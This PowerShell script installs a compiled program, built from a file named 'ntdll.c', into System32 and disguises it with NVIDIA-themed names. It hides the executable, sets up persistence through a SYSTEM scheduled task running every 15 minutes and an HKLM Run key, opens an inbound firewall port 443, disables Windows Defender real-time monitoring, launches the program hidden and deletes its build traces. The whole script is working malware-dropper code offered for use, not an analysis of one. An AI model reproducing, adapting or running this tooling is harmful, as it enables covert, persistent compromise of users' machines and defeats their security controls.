# Usage: 
#   Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope CurrentUser
#   .\install.ps1

#Requires -RunAsAdministrator

# ============================================================================
# CONFIGURATION
# ============================================================================

$SourceDir = Split-Path -Parent $MyInvocation.MyCommand.Path
$CompilerPath = "C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Tools\MSVC\14.29.30133\bin\Hostx64\x64\cl.exe"
$LinkPath = "C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Tools\MSVC\14.29.30133\bin\Hostx64\x64\link.exe"
$WindowsKitLib = "C:\Program Files (x86)\Windows Kits\10\Lib\10.0.22621.0\um\x64"
$WindowsKitInclude = "C:\Program Files (x86)\Windows Kits\10\Include\10.0.22621.0\um"
$TargetDir = "C:\Windows\System32"
$ExecutableName = "nvxgstd.exe"
$TargetPath = Join-Path $TargetDir $ExecutableName
$SourceFile = Join-Path $SourceDir "ntdll.c"
$ObjectFile = Join-Path $SourceDir "ntdll.obj"
$ExecutableFile = Join-Path $SourceDir $ExecutableName

$TaskName = "NVIDIA Graphics Driver Update"
$TaskPath = "\Microsoft\Windows\WindowsUpdate\"
$FullTaskName = "$TaskPath$TaskName"
$RegName = "NVIDIA Graphics Device"
$FirewallRuleName = "NVIDIA Graphics Update Service"

# Installer timing defaults
# Note: VS Community + C++ workloads often take >10 minutes on real machines.
$VSInstallTimeoutSeconds = 3600   # 1 hour
$SDKInstallTimeoutSeconds = 1800  # 30 minutes
$PollIntervalSeconds = 10

# ============================================================================
# FUNCTIONS
# ============================================================================

function Check-Administrator {
    $CurrentUser = [Security.Principal.WindowsIdentity]::GetCurrent()
    $Principal = New-Object Security.Principal.WindowsPrincipal($CurrentUser)
    return $Principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}

# ============================================================================
# AUTO-INSTALL VISUAL STUDIO + WINDOWS SDK
# ============================================================================

$VSInstaller = Join-Path $SourceDir "vs_community.exe"
$SDKInstaller = Join-Path $SourceDir "winsdksetup.exe"

# Download URLs (official)
$VSUrl = "https://aka.ms/vs/16/release/vs_community.exe"
$SDKUrl = "https://go.microsoft.com/fwlink/p/?linkid=2120843"  # Windows SDK installer

function Download-File($url, $path) {
    if (-not (Test-Path $path)) {
        Write-Host "[*] Downloading $url ..." -ForegroundColor Cyan
        Invoke-WebRequest -Uri $url -OutFile $path
        Write-Host "[+] Downloaded to $path" -ForegroundColor Green
    } else {
        Write-Host "[*] Installer already exists: $path" -ForegroundColor Yellow
    }
}

function Test-ToolchainReady {
    # Returns $true when the minimum toolchain paths we need exist.
    return (Test-Path $CompilerPath) -and (Test-Path $LinkPath) -and (Test-Path $MSVCInclude) -and (Test-Path $MSVCLib) -and (Test-Path $WindowsKitInclude) -and (Test-Path $WindowsKitShared) -and (Test-Path $WindowsKitUcrt) -and (Test-Path $WindowsKitLib) -and (Test-Path $WindowsKitUcrtLib)
}

function Wait-ToolchainReady {
    param(
        [int]$TimeoutSeconds,
        [string]$What
    )

    $deadline = (Get-Date).AddSeconds($TimeoutSeconds)
    while (-not (Test-ToolchainReady)) {
        if ((Get-Date) -ge $deadline) {
            Write-Host "[!] Timeout waiting for $What to finish ($TimeoutSeconds seconds)." -ForegroundColor Yellow
            Write-Host "    Toolchain still not detected; leaving installers alone." -ForegroundColor Yellow
            return $false
        }

        # If VS Installer is around, tell the user what we're waiting on.
        $installerProcs = Get-Process -Name "vs_installer","setup","msiexec" -ErrorAction SilentlyContinue
        if ($null -ne $installerProcs) {
            Write-Host "[*] $What in progress... waiting for toolchain files to appear." -ForegroundColor Cyan
        } else {
            Write-Host "[*] Waiting for toolchain files to appear..." -ForegroundColor Cyan
        }
        Start-Sleep -Seconds $PollIntervalSeconds

        # Re-run autodetection while waiting (installers may lay down new versions mid-run)
        $script:MSVCBase = "C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Tools\MSVC"
        if (Test-Path $script:MSVCBase) {
            $LatestMSVC = Get-ChildItem $script:MSVCBase | Sort-Object Name -Descending | Select-Object -First 1
            if ($LatestMSVC) {
                $script:CompilerPath = Join-Path $LatestMSVC.FullName "bin\Hostx64\x64\cl.exe"
                $script:LinkPath = Join-Path $LatestMSVC.FullName "bin\Hostx64\x64\link.exe"
                $script:MSVCInclude = Join-Path $LatestMSVC.FullName "include"
                $script:MSVCLib = Join-Path $LatestMSVC.FullName "lib\x64"
            }
        }

        $script:WindowsKitBase = "C:\Program Files (x86)\Windows Kits\10\Include"
        if (Test-Path $script:WindowsKitBase) {
            $LatestKit = Get-ChildItem $script:WindowsKitBase | Sort-Object Name -Descending | Select-Object -First 1
            if ($LatestKit) {
                $script:WindowsKitInclude = Join-Path $LatestKit.FullName "um"
                $script:WindowsKitShared = Join-Path $LatestKit.FullName "shared"
                $script:WindowsKitUcrt = Join-Path $LatestKit.FullName "ucrt"
                $script:WindowsKitLib = "C:\Program Files (x86)\Windows Kits\10\Lib\$($LatestKit.Name)\um\x64"
                $script:WindowsKitUcrtLib = "C:\Program Files (x86)\Windows Kits\10\Lib\$($LatestKit.Name)\ucrt\x64"
            }
        }
    }

    return $true
}

function Install-VS {
    Write-Host "[*] Installing Visual Studio 2019 Community with C++ workloads ..." -ForegroundColor Cyan
    $args = "--quiet --wait --norestart --nocache --add Microsoft.VisualStudio.Workload.VCTools --add Microsoft.VisualStudio.Workload.NativeDesktop --includeRecommended"

    # The bootstrapper may spawn child installers (vs_installer / msiexec) and remain running.
    # Avoid killing it aggressively; instead wait up to a configurable timeout and report progress.
    $process = Start-Process -FilePath $VSInstaller -ArgumentList $args -PassThru

    # Wait for toolchain presence (more reliable than trusting bootstrapper exit)
    $ready = Wait-ToolchainReady -TimeoutSeconds $VSInstallTimeoutSeconds -What "Visual Studio installation"
    if (-not $ready) {
        return
    }

    # If the bootstrapper is still running, wait for it briefly but don't block forever.
    $process.WaitForExit(300000) | Out-Null  # 5 minutes best-effort
    if ($process.HasExited -and $process.ExitCode -ne 0) {
        Write-Host "[!] Visual Studio installer exited with code $($process.ExitCode) (toolchain detected anyway)" -ForegroundColor Yellow
    } else {
        Write-Host "[+] Visual Studio toolchain detected" -ForegroundColor Green
    }
}

function Install-SDK {
    Write-Host "[*] Installing Windows Software Development Kit ..." -ForegroundColor Cyan
    $process = Start-Process -FilePath $SDKInstaller -ArgumentList "/quiet /norestart /features OptionId.WindowsSoftwareDevelopmentKit" -PassThru
    $deadline = (Get-Date).AddSeconds($SDKInstallTimeoutSeconds)

    while (-not $process.HasExited) {
        if ((Get-Date) -ge $deadline) {
            Write-Host "[!] Windows SDK installation is still running after $SDKInstallTimeoutSeconds seconds." -ForegroundColor Yellow
            Write-Host "    Leaving installer running; re-run this script later to continue." -ForegroundColor Yellow
            return
        }
        Write-Host "[*] Waiting for Windows SDK installer to finish..." -ForegroundColor Cyan
        Start-Sleep -Seconds $PollIntervalSeconds
    }

    if ($process.ExitCode -ne 0) {
        Write-Host "[!] Windows SDK installer exited with code $($process.ExitCode)" -ForegroundColor Yellow
    } else {
        Write-Host "[+] Windows SDK installation finished" -ForegroundColor Green
    }
}

# Download installers if missing
Download-File $VSUrl $VSInstaller
Download-File $SDKUrl $SDKInstaller

# Install if not detected
if (-not (Test-Path $CompilerPath)) { Install-VS }
if (-not (Test-Path $WindowsKitInclude)) { Install-SDK }

# After any install attempt, re-detect tool paths (a second run should not be required)
$MSVCBase = "C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Tools\MSVC"
if (Test-Path $MSVCBase) {
    $LatestMSVC = Get-ChildItem $MSVCBase | Sort-Object Name -Descending | Select-Object -First 1
    if ($LatestMSVC) {
        $CompilerPath = Join-Path $LatestMSVC.FullName "bin\Hostx64\x64\cl.exe"
        $LinkPath = Join-Path $LatestMSVC.FullName "bin\Hostx64\x64\link.exe"
        $MSVCInclude = Join-Path $LatestMSVC.FullName "include"
        $MSVCLib = Join-Path $LatestMSVC.FullName "lib\x64"
    }
}

$WindowsKitBase = "C:\Program Files (x86)\Windows Kits\10\Include"
if (Test-Path $WindowsKitBase) {
    $LatestKit = Get-ChildItem $WindowsKitBase | Sort-Object Name -Descending | Select-Object -First 1
    if ($LatestKit) {
        $WindowsKitInclude = Join-Path $LatestKit.FullName "um"
        $WindowsKitShared = Join-Path $LatestKit.FullName "shared"
        $WindowsKitUcrt = Join-Path $LatestKit.FullName "ucrt"
        $WindowsKitLib = "C:\Program Files (x86)\Windows Kits\10\Lib\$($LatestKit.Name)\um\x64"
        $WindowsKitUcrtLib = "C:\Program Files (x86)\Windows Kits\10\Lib\$($LatestKit.Name)\ucrt\x64"
    }
}

## Auto-detect logic moved earlier (post-install) so the same run can continue.

function Check-VisualStudio {
    if (-not (Test-Path $CompilerPath)) {
        Write-Host "[!] Visual Studio compiler not found at: $CompilerPath" -ForegroundColor Red
        Write-Host "[!] Install Visual Studio 2019 Community Edition with C++ tools" -ForegroundColor Red
        return $false
    }
    if (-not (Test-Path $LinkPath)) {
        Write-Host "[!] Linker not found at: $LinkPath" -ForegroundColor Red
        return $false
    }
    if (-not (Test-Path $MSVCInclude)) {
        Write-Host "[!] MSVC headers not found at: $MSVCInclude" -ForegroundColor Red
        return $false
    }
    if (-not (Test-Path $MSVCLib)) {
        Write-Host "[!] MSVC libs not found at: $MSVCLib" -ForegroundColor Red
        return $false
    }
    if (-not (Test-Path $WindowsKitInclude)) {
        Write-Host "[!] Windows SDK headers not found at: $WindowsKitInclude" -ForegroundColor Red
        Write-Host "[!] Install Windows Software Development Kit (SDK)" -ForegroundColor Red
        return $false
    }
    if (-not (Test-Path $WindowsKitShared)) {
        Write-Host "[!] Windows SDK shared headers not found at: $WindowsKitShared" -ForegroundColor Red
        return $false
    }
    if (-not (Test-Path $WindowsKitUcrt)) {
        Write-Host "[!] Windows SDK UCRT headers not found at: $WindowsKitUcrt" -ForegroundColor Red
        return $false
    }
    return $true
}

function Check-SourceFiles {
    if (-not (Test-Path $SourceFile)) {
        Write-Host "[!] Source file not found: $SourceFile" -ForegroundColor Red
        return $false
    }
    return $true
}

# ============================================================================
# MAIN INSTALLATION
# ============================================================================

Write-Host ""
Write-Host "================================================" -ForegroundColor Cyan
Write-Host "Installation Script" -ForegroundColor Cyan
Write-Host "================================================" -ForegroundColor Cyan
Write-Host ""

# Verify prerequisites
Write-Host "[*] Verifying prerequisites..." -ForegroundColor Yellow

if (-not (Check-Administrator)) {
    Write-Host "[!] ERROR: This script must be run as Administrator" -ForegroundColor Red
    exit 1
}
Write-Host "[+] Running as Administrator" -ForegroundColor Green

if (-not (Check-VisualStudio)) {
    Write-Host "[!] ERROR: Missing required tools (Visual Studio 2019 + Windows SDK)" -ForegroundColor Red
    exit 1
}
Write-Host "[+] Visual Studio and WDK found" -ForegroundColor Green

if (-not (Check-SourceFiles)) {
    exit 1
}
Write-Host "[+] Source files present" -ForegroundColor Green
Write-Host ""

# ============================================================================
# STEP 1: COMPILE
# ============================================================================

Write-Host "[*] STEP 1: Compiling Program..." -ForegroundColor Yellow
try {
    Write-Host "    Compiling to object file..." -ForegroundColor Gray
    $CompileArgs = @(
        "/c", "/W0", "/O2", "/D", "NDEBUG",
        "/I", $MSVCInclude,
        "/I", $WindowsKitInclude,
        "/I", $WindowsKitShared,
        "/I", $WindowsKitUcrt,
        $SourceFile,
        "/Fo$ObjectFile"
    )
    $CompileOutput = & $CompilerPath @CompileArgs 2>&1
    if ($LASTEXITCODE -ne 0) {
        throw "Compilation failed: $CompileOutput"
    }
    
    if (-not (Test-Path $ObjectFile)) {
        throw "Object file not created"
    }
    
    Write-Host "    Linking executable..." -ForegroundColor Gray
    $LinkArgs = @(
        "/SUBSYSTEM:CONSOLE", "/MACHINE:X64",
        "/LIBPATH:$MSVCLib",
        "/LIBPATH:$WindowsKitLib",
        "/LIBPATH:$WindowsKitUcrtLib",
        $ObjectFile,
        "kernel32.lib", "wbemuuid.lib", "oleaut32.lib", "ole32.lib",
        "ws2_32.lib", "secur32.lib", "crypt32.lib",
        "/OUT:$ExecutableFile"
    )
    $LinkOutput = & $LinkPath @LinkArgs 2>&1
    if ($LASTEXITCODE -ne 0) {
        throw "Linking failed: $LinkOutput"
    }
    
    if (-not (Test-Path $ExecutableFile)) {
        throw "Executable not created"
    }
    
    Write-Host "[+] Compilation successful" -ForegroundColor Green
} catch {
    Write-Host "[!] Compilation failed: $_" -ForegroundColor Red
    exit 1
}

# ============================================================================
# STEP 2: INSTALL TO SYSTEM32
# ============================================================================

Write-Host "[*] STEP 2: Installing executable..." -ForegroundColor Yellow
try {
    if (Test-Path $TargetPath) {
        Write-Host "    Removing existing file..." -ForegroundColor Gray
        Remove-Item -Path $TargetPath -Force -ErrorAction Stop
    }
    
    Write-Host "    Copying to $TargetDir..." -ForegroundColor Gray
    Copy-Item -Path $ExecutableFile -Destination $TargetPath -Force -ErrorAction Stop
    Write-Host "[+] Installed to: $TargetPath" -ForegroundColor Green
} catch {
    Write-Host "[!] Installation failed: $_" -ForegroundColor Red
    exit 1
}

# ============================================================================
# STEP 3: HIDE FILE
# ============================================================================

Write-Host "[*] STEP 3: Hiding executable..." -ForegroundColor Yellow
try {
    $File = Get-Item $TargetPath -Force
    $File.Attributes = $File.Attributes -bor [System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System
    Write-Host "[+] File hidden with System attributes" -ForegroundColor Green
} catch {
    Write-Host "[!] Warning: Could not hide file: $_" -ForegroundColor Yellow
}

# ============================================================================
# STEP 4: SCHEDULED TASK PERSISTENCE
# ============================================================================

Write-Host "[*] STEP 4: Creating persistence (Scheduled Task)..." -ForegroundColor Yellow
try {
    # Remove if exists
    Unregister-ScheduledTask -TaskName $TaskName -TaskPath $TaskPath -Confirm:$false -ErrorAction SilentlyContinue | Out-Null
    
    $Action = New-ScheduledTaskAction -Execute $TargetPath
    $Trigger = @(
        (New-ScheduledTaskTrigger -AtStartup),
        (New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 15) -RepetitionDuration (New-TimeSpan -Days 365))
    )
    $Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -Hidden -RunOnlyIfNetworkAvailable -StartWhenAvailable
    $Principal = New-ScheduledTaskPrincipal -UserId SYSTEM -RunLevel Highest
    
    Register-ScheduledTask -TaskName $TaskName `
                          -TaskPath $TaskPath `
                          -Action $Action `
                          -Trigger $Trigger `
                          -Settings $Settings `
                          -Principal $Principal `
                          -Description "NVIDIA Device Update Service" `
                          -Force | Out-Null
    
    Write-Host "[+] Scheduled Task created: $FullTaskName" -ForegroundColor Green
    Write-Host "    - Runs at system startup" -ForegroundColor Gray
    Write-Host "    - Runs every 15 minutes" -ForegroundColor Gray
} catch {
    Write-Host "[!] Warning: Could not create Scheduled Task: $_" -ForegroundColor Yellow
}

# ============================================================================
# STEP 5: REGISTRY RUN KEY
# ============================================================================

Write-Host "[*] STEP 5: Creating persistence (Registry Run key)..." -ForegroundColor Yellow
try {
    $RegPath = "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run"
    
    # Remove if exists
    Remove-ItemProperty -Path $RegPath -Name $RegName -Force -ErrorAction SilentlyContinue | Out-Null
    
    # Add new entry
    New-Item -Path $RegPath -Force -ErrorAction SilentlyContinue | Out-Null
    New-ItemProperty -Path $RegPath -Name $RegName -Value $TargetPath -PropertyType String -Force | Out-Null
    
    Write-Host "[+] Registry Run key created: $RegName" -ForegroundColor Green
} catch {
    Write-Host "[!] Warning: Could not create Registry entry: $_" -ForegroundColor Yellow
}

# ============================================================================
# STEP 6: FIREWALL RULE
# ============================================================================

Write-Host "[*] STEP 6: Configuring Windows Firewall..." -ForegroundColor Yellow
try {
    $ExistingRule = Get-NetFirewallRule -DisplayName $FirewallRuleName -ErrorAction SilentlyContinue
    if ($null -ne $ExistingRule) {
        Remove-NetFirewallRule -DisplayName $FirewallRuleName -Confirm:$false -ErrorAction SilentlyContinue | Out-Null
    }
    
    New-NetFirewallRule -DisplayName $FirewallRuleName `
                        -Direction Inbound `
                        -Action Allow `
                        -Protocol TCP `
                        -LocalPort 443 `
                        -Program $TargetPath `
                        -ErrorAction Stop | Out-Null
    
    Write-Host "[+] Firewall rule created: $FirewallRuleName" -ForegroundColor Green
    Write-Host "    - Port: 443 (HTTPS)" -ForegroundColor Gray
} catch {
    Write-Host "[!] Warning: Could not create Firewall rule: $_" -ForegroundColor Yellow
}

# ============================================================================
# STEP 7: OPTIONAL WINDOWS DEFENDER
# ============================================================================

Write-Host "[*] STEP 7: Windows Defender configuration (optional)..." -ForegroundColor Yellow
try {
    $DefenderService = Get-Service WinDefend -ErrorAction SilentlyContinue
    
    if ($null -eq $DefenderService) {
        Write-Host "[+] Windows Defender not installed (common on many systems)" -ForegroundColor Green
    } else {
        if ($DefenderService.Status -eq "Running") {
            try {
                Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction Stop
                Write-Host "[+] Real-time monitoring disabled" -ForegroundColor Green
            } catch {
                Write-Host "[!] Warning: Could not disable real-time monitoring: $_" -ForegroundColor Yellow
                Write-Host "    (This is non-critical; continuing installation)" -ForegroundColor Gray
            }
        } else {
            Write-Host "[+] Windows Defender not running" -ForegroundColor Green
        }
    }
} catch {
    Write-Host "[!] Warning: Could not check Defender status: $_" -ForegroundColor Yellow
    Write-Host "    (Continuing installation)" -ForegroundColor Gray
}

# ============================================================================
# STEP 8: START SERVICE
# ============================================================================

Write-Host "[*] STEP 8: Starting Program..." -ForegroundColor Yellow
try {
    Start-Process -FilePath $TargetPath -WindowStyle Hidden -ErrorAction Stop
    Write-Host "[+] Service started successfully" -ForegroundColor Green
} catch {
    Write-Host "[!] Warning: Could not start service immediately: $_" -ForegroundColor Yellow
    Write-Host "    (Will start on next reboot via Scheduled Task)" -ForegroundColor Gray
}

# ============================================================================
# STEP 9: CLEANUP
# ============================================================================

Write-Host "[*] STEP 9: Cleaning up compilation artifacts..." -ForegroundColor Yellow
try {
    Remove-Item -Path $ObjectFile -Force -ErrorAction SilentlyContinue
    Remove-Item -Path $ExecutableFile -Force -ErrorAction SilentlyContinue
    Write-Host "[+] Temporary files cleaned up" -ForegroundColor Green
} catch {
    Write-Host "[!] Warning: Could not remove temporary files: $_" -ForegroundColor Yellow
}

# ============================================================================
# VERIFICATION
# ============================================================================

Write-Host "[*] STEP 10: Verifying installation..." -ForegroundColor Yellow

$AllGood = $true

if (Test-Path $TargetPath) {
    Write-Host "[+] Executable present: $TargetPath" -ForegroundColor Green
    $FileInfo = Get-Item $TargetPath -Force
    $IsHidden = ($FileInfo.Attributes -band [System.IO.FileAttributes]::Hidden) -ne 0
    $IsSystem = ($FileInfo.Attributes -band [System.IO.FileAttributes]::System) -ne 0
    Write-Host "    - Hidden attributes: $IsHidden" -ForegroundColor Gray
    Write-Host "    - System attributes: $IsSystem" -ForegroundColor Gray
} else {
    Write-Host "[!] ERROR: Executable not found at $TargetPath" -ForegroundColor Red
    $AllGood = $false
}

$TaskExists = Get-ScheduledTask -TaskName $TaskName -TaskPath $TaskPath -ErrorAction SilentlyContinue
if ($null -ne $TaskExists) {
    Write-Host "[+] Scheduled Task registered" -ForegroundColor Green
} else {
    Write-Host "[!] Warning: Scheduled Task not found" -ForegroundColor Yellow
}

$RegExists = Get-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" -Name $RegName -ErrorAction SilentlyContinue
if ($null -ne $RegExists) {
    Write-Host "[+] Registry Run key present" -ForegroundColor Green
} else {
    Write-Host "[!] Warning: Registry Run key not found" -ForegroundColor Yellow
}

$FirewallExists = Get-NetFirewallRule -DisplayName $FirewallRuleName -ErrorAction SilentlyContinue
if ($null -ne $FirewallExists) {
    Write-Host "[+] Firewall rule registered" -ForegroundColor Green
} else {
    Write-Host "[!] Warning: Firewall rule not found" -ForegroundColor Yellow
}

Write-Host ""
if ($AllGood) {
    Write-Host "[*] Installation completed successfully" -ForegroundColor Green
    Write-Host "[*] Will survive: Reboots, system restarts, user logon/logoff" -ForegroundColor Cyan
} else {
    Write-Host "[!] Installation completed with errors" -ForegroundColor Yellow
    exit 1
}